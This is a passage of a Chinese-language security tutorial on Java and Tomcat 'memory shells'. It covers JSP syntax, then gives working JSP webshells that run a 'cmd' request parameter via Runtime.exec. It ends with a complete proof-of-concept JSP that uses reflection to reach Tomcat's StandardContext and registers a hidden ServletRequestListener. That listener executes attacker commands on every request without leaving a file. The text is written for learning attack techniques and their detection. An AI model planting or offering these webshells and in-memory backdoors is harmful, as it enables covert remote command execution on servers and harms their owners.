    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1355">参考文章</a>     <a href="https://github.com/Claradoll/Security_Learning">题目用到的代码地址</a></p><p><strong>内存马的分类</strong></p><p><img src="../images/image-20230720170329358.png" alt="image-20230720170329358"></p><p>解释一下<code>servlet</code></p><p><img src="../images/image-20230731220207808.png" alt="image-20230731220207808"></p><p><strong>就是大致分为这四种   下面会依次讲到</strong></p><p><strong>这里的话先了解一下  <code>JSP</code>  是什么</strong></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="JSP简介"><a href="#JSP简介" class="headerlink" title="JSP简介"></a>JSP简介</h3><p><strong>这里主要了解一下  <code>JSP</code>  的语法</strong>    </p><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id="JSP语法"><a href="#JSP语法" class="headerlink" title="JSP语法"></a>JSP语法</h3><h4 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h4><p>脚本程序可以包含任意量的<strong>Java语句、变量、方法或表达式</strong>，只要它们在脚本语言中是有效的。脚本程序的格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>其等价与下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:scriptlet</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用实例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;success&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162202992.png" alt="image-20230720162202992"></p><h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><p>一个声明语句可以声明<strong>一个或多个变量、方法</strong>，供后面的Java代码使用。JSP声明语句格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! 声明  %&gt;</span><br></pre></td></tr></table></figure><p>等同于下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:declaration</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:declaration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;s&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162541860.png" alt="image-20230720162541860"></p><h4 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h4><p>如果JSP表达式中为一个对象，则会自动调用其<code>toString()</code>方法。格式如下，注意表达式后没有<code>;</code></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式  %&gt;</span><br></pre></td></tr></table></figure><p>等价于下面的XML表达式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:expression</span>&gt;</span></span><br><span class="line">   表达式</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:expression</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Feng&quot;</span>; %&gt;</span><br><span class="line">username:&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163023029.png" alt="image-20230720163023029"></p><h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>&lt;%@ page … %&gt;</td><td>定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</td></tr><tr><td>&lt;%@ include … %&gt;</td><td>包含其他文件</td></tr><tr><td>&lt;%@ taglib … %&gt;</td><td>引入标签库的定义，可以是自定义标签</td></tr></tbody></table></div><p>比如我们能通过page指令来设置jsp页面的编码格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><p>使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;林&quot;</span>; %&gt;</span><br><span class="line">    用户名：&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163914388.png" alt="image-20230720163914388"></p><h4 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a>JSP注释</h4><p>格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- 注释内容 --%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP内置对象"><a href="#JSP内置对象" class="headerlink" title="JSP内置对象"></a>JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p><ul><li>由 JSP 规范提供，不用编写者实例化</li><li>通过 Web 容器实现和管理</li><li>所有 JSP 页面均可使用</li><li>只有在脚本元素的表达式或代码段中才能使用</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">对象</th><th style="text-align:left">类型</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">request</td><td style="text-align:left">javax.servlet.http.HttpServletRequest</td><td style="text-align:left">获取用户请求信息</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.http.HttpServletResponse</td><td style="text-align:left">响应客户端请求，并将处理信息返回到客户端</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.jsp.JspWriter</td><td style="text-align:left">输出内容到 HTML 中</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">javax.servlet.http.HttpSession</td><td style="text-align:left">用来保存用户信息</td></tr><tr><td style="text-align:left">application</td><td style="text-align:left">javax.servlet.ServletContext</td><td style="text-align:left">所有用户共享信息</td></tr><tr><td style="text-align:left">config</td><td style="text-align:left">javax.servlet.ServletConfig</td><td style="text-align:left">这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td></tr><tr><td style="text-align:left">pageContext</td><td style="text-align:left">javax.servlet.jsp.PageContext</td><td style="text-align:left">JSP 的页面容器，用于访问 page、request、application 和 session 的属性</td></tr><tr><td style="text-align:left">page</td><td style="text-align:left">javax.servlet.jsp.HttpJspPage</td><td style="text-align:left">类似于 Java 类的 this 关键字，表示当前 JSP 页面</td></tr><tr><td style="text-align:left">exception</td><td style="text-align:left">java.lang.Throwable</td><td style="text-align:left">该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象</td></tr></tbody></table></div><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><p>我们先来看看传统的JSP木马是如何实现的</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p>上面是最简单的一句话木马，没有回显，适合用来反弹shell。下面是一个带回显的JSP木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720165934722.png" alt="image-20230720165934722"></p><p><strong>这就是上面代码的含义</strong></p><p>传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。</p><h2 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h2><p>这里的话就不跟着上面的文章写了 </p><p>直接看总结就行了</p><p><strong>直接用一张图来展示这三者的关系</strong></p><p><img src="../images/image-20230720171447069.png" alt="image-20230720171447069"></p><p>这三者是我们在学习内存马的时候会经常遇到的</p><p><code>ServletContext</code>接口的实现类为<code>ApplicationContext</code>类和<code>ApplicationContextFacade</code>类，其中<code>ApplicationContextFacade</code>是对<code>ApplicationContext</code>类的包装。我们对<code>Context</code>容器中各种资源进行操作时，最终调用的还是<code>StandardContext</code>中的方法，因此<code>StandardContext</code>是<code>Tomcat</code>中负责与底层交互的<code>Context</code>。</p><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>在学习下面三种类型的内存马的时候可以看看这篇文章  因为这篇文章很好的解释了下面三者的含义    </p><p><a href="https://goodapple.top/archives/1359">tomcat详解</a></p><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.55<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的使用的文件直接就是文章开头的<code>github</code>地址用的   下载下来导入就行了</p><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里的话模拟动态注册进去的<code>Listener</code>内存马</strong>      (<strong>等会我们分析完这个流程就会重新动态的导入一个内存马，并把上面的这个代码给注释掉</strong>)</p><p><img src="../images/image-20230720172131744.png" alt="image-20230720172131744"></p><p>​    </p><p>给这里下个断点  然后<code>debug</code>一下 得到他的利用栈</p><p><img src="../images/image-20230720172237569.png" alt="image-20230720172237569"></p><p>分析这个利用栈</p><p><code>StandardContext#fireRequestInitEvent</code>调用了我们的<code>Listener</code>，我们跟进看其实现</p><p><img src="../images/image-20230720172338598.png" alt="image-20230720172338598"></p><p>关键代码有两处，首先通过<code>getApplicationEventListeners()</code>获取一个Listener数组，然后遍历数组调用<code>listener.requestInitialized(event)</code>方法触发Listener。跟进<code>getApplicationEventListeners()</code>方法</p><p>这里的获取这个<code>Listener</code>就是关键了  因为就是我们就是恶意构造一个<code>Listener</code>传进去 然后让其获取加载(<strong>不出意外的话继续找下去能找到添加<code>Listener</code>的地方</strong>)</p><p><img src="../images/image-20230720173457320.png" alt="image-20230720173457320"></p><p>可以看到Listener实际上是存储在<em><code>applicationEventListenersList</code></em>属性中的</p><p><img src="../images/image-20230720173533994.png" alt="image-20230720173533994"></p><p>并且我们可以通过<code>StandardContext#addApplicationEventListener()</code>方法来添加<code>Listener</code></p><p><img src="../images/image-20230720173728831.png" alt="image-20230720173728831"></p><p>看到这里的话就和我们刚开始添加的这个<code>Listener</code>联系到一起了</p><p><img src="../images/image-20230720173826866.png" alt="image-20230720173826866"></p><p>实际情况中是没有它的  现在我们分析利用链  分析到了这个添加<code>listener</code>的地方</p><p>所以我们就得想办法构造恶意的<code>listener</code>来添加进去了</p><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>下面的工作就是获取<code>StandardContext</code>类了，在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><p><img src="../images/image-20230720174343442.png" alt="image-20230720174343442"></p><p>同样地，由于<code>JSP</code>内置了<code>request</code>对象，我们也可以使用同样的方式来获取</p><p><strong>(一共内置了9个对象   <code>request</code>是其中一个)</strong></p><p><img src="../images/image-20230731225244116.png" alt="image-20230731225244116"></p><p>所以获取<code>StandardContext</code>的方法是</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>request</code>是 <code>HttpServletRequest</code> 类的对象</p><p>先是获取了request对象里面的request属性   然后将该属性设置为可访问</p><p>在此行中通过调用该引用上的 get() 方法来获取实际存储在 “request” 字段中的值，并将其强制转换为类型 Request 并赋值给名为 req 的变量(<strong>为什么要用这个Request类型  图片上有标注</strong>)</p><p>然后就能获取到<code>StandardContext</code> 了</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>这是另一种获取<code>StandardContext</code>的方法</strong></p><p>接下来我们就可以来构造<code>poc</code>了</p><p><strong>先编写一个恶意的<code>Listener</code></strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>然后添加监听器</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>context</code>是上面获取的<code>StandardContext</code></p><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><ul><li>获取<code>StandardContext</code>上下文</li><li>实现一个恶意<code>Listener</code></li><li>通过<code>StandardContext#addApplicationEventListener</code>方法添加恶意<code>Listener</code></li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>将上面的代码连起来解释就是</p><p><img src="../images/image-20230801103848317.png" alt="image-20230801103848317"></p><p>这里是先获取这个到这个<code>StandardContext</code> 这个类   